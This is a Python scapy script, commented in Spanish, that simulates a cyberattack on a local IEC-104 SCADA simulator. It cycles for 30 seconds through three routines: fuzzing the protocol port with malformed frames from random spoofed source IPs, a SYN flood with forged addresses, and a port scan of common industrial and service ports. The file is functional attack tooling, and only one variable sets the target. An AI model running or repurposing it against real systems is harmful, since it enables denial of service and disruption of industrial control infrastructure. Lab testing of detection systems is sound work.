import sys
import time
import random
import logging
from scapy.all import IP, TCP, UDP, send, Raw, RandIP

# Configuración
TARGET_IP = "127.0.0.1"  # Apuntamos al simulador local
TARGET_PORT = 2404       # Puerto IEC-104
DURATION = 30            # Segundos de ataque

# Colores para la consola
RED = "\033[91m"
RESET = "\033[0m"

print(f"{RED}🚀 INICIANDO SIMULACIÓN DE CIBERATAQUE (IEC-104 FUZZING & FLOOD){RESET}")
print(f"Objetivo: {TARGET_IP}:{TARGET_PORT}")
print("---------------------------------------------------")

def attack_iec104_fuzzing():
    """Envía paquetes malformados al puerto SCADA"""
    print(f"⚡ Ejecutando: IEC-104 Payload Fuzzing...")
    
    # Generamos payloads aleatorios (basura) para confundir al protocolo
    for _ in range(50):
        # Creamos una trama que parece IEC pero tiene datos corruptos
        payload = b'\x68' + bytes([random.randint(0, 255) for _ in range(10)])
        
        pkt = IP(dst=TARGET_IP, src=str(RandIP()))/TCP(dport=TARGET_PORT)/Raw(load=payload)
        send(pkt, verbose=0)
        time.sleep(0.05)

def attack_dos_flood():
    """Inundación de paquetes (DoS)"""
    print(f"🌊 Ejecutando: TCP SYN Flood (Volumétrico)...")
    
    for _ in range(200):
        # IP origen falsificada (Spoofing) para que parezca un ataque distribuido
        fake_ip = f"192.168.1.{random.randint(50, 200)}"
        
        pkt = IP(dst=TARGET_IP, src=fake_ip)/TCP(dport=TARGET_PORT, flags="S")
        send(pkt, verbose=0)
        time.sleep(0.01)

def attack_port_scan():
    """Escaneo de puertos ruidoso"""
    print(f"🔍 Ejecutando: Escaneo de Puertos Agresivo...")
    
    common_ports = [21, 22, 80, 443, 502, 2404, 3306, 8080]
    for port in common_ports:
        pkt = IP(dst=TARGET_IP)/TCP(dport=port, flags="S")
        send(pkt, verbose=0)

# --- BUCLE PRINCIPAL ---
try:
    start_time = time.time()
    while time.time() - start_time < DURATION:
        attack = random.choice([attack_iec104_fuzzing, attack_dos_flood, attack_port_scan])
        attack()
        print(f"--- Ciclo completado. Continuando asedio... ---")
        time.sleep(1)

    print(f"\n{RED}🛑 ATAQUE FINALIZADO.{RESET}")

except KeyboardInterrupt:
    print("\nDetenido por usuario.")